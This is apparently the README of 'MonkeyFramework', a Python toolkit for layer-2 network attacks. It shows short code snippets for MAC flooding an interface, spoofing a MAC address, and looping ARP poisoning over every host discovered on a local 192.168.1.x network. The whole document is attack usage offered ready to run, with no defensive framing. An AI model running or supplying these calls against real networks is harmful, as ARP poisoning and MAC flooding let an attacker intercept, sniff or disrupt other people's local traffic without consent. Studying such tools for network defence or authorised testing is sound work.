# MonkeyFramework

### MAC Flooding
```
from attack.leyer_2.mac import mac_flooding
mac_flooding('wlp3s0')
```
### MAC Spoofing
```
from attack.leyer_2.mac import mac_spoofing
mac_spoofing('wlp3s0', '92:92:92:92:92:92')
```

### ARP POISONING
```
from discover.arp_discover import arp_discover
from attack.leyer_2.arp import arp_poisoning

for host in arp_discover(ip_addr='192.168.1.1'):
    arp_poisoning('192.168.1.11', '80:45:dd:93:95:31', host.ip, host.mac)
```